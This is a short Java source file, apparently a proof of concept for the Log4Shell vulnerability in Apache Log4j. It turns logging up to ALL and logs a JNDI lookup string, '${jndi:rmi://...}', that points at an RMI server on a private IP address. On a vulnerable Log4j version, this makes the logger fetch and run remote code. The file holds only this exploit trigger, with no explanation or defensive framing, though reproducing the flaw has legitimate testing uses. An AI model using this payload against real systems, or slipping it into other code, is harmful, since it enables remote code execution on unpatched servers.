package com.ocean;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.LoggerConfig;

public class Log4j_vul {
    public static final Logger logger = LogManager.getLogger(Log4j_vul.class);
    public static void main(String[] args) {
        LoggerContext ctx          = (LoggerContext) LogManager.getContext(false);
        Configuration config       = ctx.getConfiguration();
        LoggerConfig loggerConfig = config.getLoggerConfig(LogManager.ROOT_LOGGER_NAME);
        loggerConfig.setLevel(Level.ALL);
        ctx.updateLoggers();
        String message = "${jndi:rmi://10.169.5.252:1099/mad9ab}";
        logger.info(message);
    }
}
